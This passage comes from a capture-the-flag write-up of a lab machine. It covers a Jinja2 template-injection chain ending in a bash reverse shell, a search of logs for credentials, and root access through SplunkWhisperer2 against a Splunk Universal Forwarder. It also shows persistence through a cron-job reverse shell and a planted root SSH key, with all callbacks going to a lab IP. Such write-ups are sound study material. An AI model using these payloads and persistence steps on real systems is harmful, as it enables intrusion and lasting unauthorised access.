security-sensitive classes. Why: This traversal is necessary to gain access to internal classes that may expose sensitive or powerful functionality. The goal is to locate a class that allows interaction with Python\u0026rsquo;s built-in capabilities, particularly those capable of importing modules or executing commands. Without this enumeration, we wouldn\u0026rsquo;t be able to dynamically discover and exploit useful subclasses like warnings.WarningMessage. Simple Terms: It\u0026rsquo;s like looking through a list of all possible tools in Python to find one that can break the system. Finding a Specific Subclass:\nfor x in ().__class__.__base__.__subclasses__(): Iterates through all subclasses of object. if \u0026quot;warning\u0026quot; in x.__name__: Filters for a subclass where \u0026quot;warning\u0026quot; exists in the class name. Example match: \u0026lt;class 'warnings.WarningMessage'\u0026gt;. Why: Not all subclasses are useful for exploitation. The filter specifically targets classes that are likely to provide the _module attribute or similar access to the __builtins__ dictionary. warnings.WarningMessage is chosen because it provides a pathway to Python\u0026rsquo;s built-in functions through its _module attribute. We use this class as a pivot to access the dangerous __builtins__['__import__'] method, which allows importing any module dynamically. Simple Terms: It\u0026rsquo;s like picking a specific tool from the list (a warning-related tool) because it opens the door to other powerful tools hidden inside Python. Accessing Built-in Functions:\nx()._module: Accesses the module of the identified subclass. .__builtins__: Retrieves the built-in functions of the module. ['__import__']('os'): Dynamically imports the os module. Executing the Reverse Shell Command:\nos.popen(\u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/9967 0\u0026gt;\u0026amp;1'\u0026quot;).read(): Opens a subprocess to execute a reverse shell command. Effect: The server connects to our machine (10.10.14.80) on port 9967, granting remote access. Exploitation Mitigation Techniques: Input Validation: Ensure user inputs are sanitized before being passed to the template. Use Sandboxed Template Engines: Configure Jinja2 with a sandbox to limit its capabilities. Disable Dangerous Features: Restrict access to functions like __builtins__ or os that can execute arbitrary commands. Discovering Our User is part of the adm group: Looking through the host there is a user called shaun, however we cannot read anything in his home directory, however we can list the contents.\nI check our group membership and can see our user is part of the adm group.\nadm primer:\nMembers of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs. We can run to search for creds: find /var/log -type f -exec grep \u0026#34;password\u0026#34; {} + find /var/log -type f -exec grep \u0026#34;username\u0026#34; {} + Finding a clear text password in /var/log/apache2 logs I run find /var/log -type f -exec grep \u0026quot;password\u0026quot; {} + \u0026amp; discover a clear text password.\nGuitar123 +Note+: Even though it appears to be being passed as an argument to the email parameter it\u0026rsquo;s not an email so we can surmise it\u0026rsquo;s a password entered incorrectly in the email field. I check if it\u0026rsquo;s valid for \u0026ldquo;Shaun\u0026rdquo; \u0026amp; can login as him\n+Note+: I check if it\u0026rsquo;s valid for ssh but it\u0026rsquo;s not. Enumerating as shaun: Let\u0026rsquo;s grab our user flag.\nI do some further enumeration but nothing is found on the host that I can see.\n3. Privilege Escalation: Logging into splunk Universal Forwarder as shaun: I re-open the splunk universal forwarder page and try shauns creds \u0026amp; they work. This time I provided with alot more options.\nNow we can enumerate this, however I know for a fact that with creds we can privesc using SplunkWhisperer2 .\nGetting root using SplunkWhisperer2 to exploit the Universal Forwarder: Quick POC to verify RCE:\nI stand up a quick python web-server and have SplunkWhisperer curl it to verify that we can infact run commands on the host \u0026amp; we can. Getting our reverse root shell:\npython3 PySplunkWhisperer2_remote.py --host $box --lhost 10.10.14.80 --username $user --password $pass --payload \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/9967 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; Lets get the root flag:\n4. Persistence: As a means to ensure persistence on this machine I will create and add an SSH key as we know that service is running. I will also add a cronjob that calls back out to my attack machine at a set interval. Persistence Method 1: Creating a cron job reverse shell: (crontab -l \u0026gt; .tab ; echo \u0026#34;* * * * * /bin/bash -c \u0026#39;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.80/80 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt;\u0026gt; .tab ; crontab .tab ; rm .tab) \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 Let\u0026rsquo;s verify it\u0026rsquo;s in the crontab by running crontab -l\nAs we can see it\u0026rsquo;s running. I start my listener and get a connection back after 1 minute.\n+Note+: This is great as a means to call back out to our attack machine, however an interval of every 1 minute is excessive, it would typically be better to set it at longer intervals to re-connect.\nPersistence Method 2: Adding an SSH key: So typically what we could do is make a new user, however I am going to generate a key for the root user we already have access too. Generate SSH Key for the User:\nssh-keygen -t rsa -b 4096 Copy Public Key to Authorized Keys:\ncp ~/.ssh/id_rsa.pub ~/.ssh/authorized_keys This command copies the public key to the authorized_keys file, which is used by SSH to authenticate the user. Copy Private key to attack machine:\ncat id_rsa Change the mode of the key so the permissions are not too open:\nsudo chmod 400 id_rsa Verify it works:\nssh -i id_rsa root@$box Lessons Learned: What did I learn? This took my way longer to complete than I would have liked. Web is currently my weakest area so I am making a concerted effort to do these types of boxes and challenges in order to improve my web weaknesses. I learned to always look at source code even if the page appears empty or unimportant. As two key pieces of information were found this way. The initial html comment regarding /archive on the message upload page. The xml contents of the /archive page itself which provided the foothold as we were able to fuzz for SSTI. I also learned I am going to grind these like I did AD boxes to improve. Doing lots of AD boxes really helped me get better and dial in. What silly mistakes did I make? I tried for a long time to connect to Splunks Universal Forwarder with HTTP, instead of HTTPS that wasted a good few mins. I had a moment where my brain was fried when figuring out cron syntax, luckily this exists https://cron.help Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n"
